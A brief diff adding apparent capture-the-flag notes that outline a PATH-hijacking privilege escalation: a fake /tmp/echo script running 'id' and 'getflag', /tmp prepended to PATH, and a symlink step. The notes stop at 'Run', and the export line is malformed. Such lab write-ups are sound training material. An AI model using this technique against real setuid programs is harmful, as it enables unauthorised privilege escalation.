@@ -1,0 +1,12 @@
+#Create echo file
+vim /tmp/echo
+id
+getflag
+
+#Chmod 755 /tmp/echo
+Set PATH, PATH from left to right
+export $PATH=/tmp:${PATH}
+echo $PATH
+
+#Create symlink
+Run
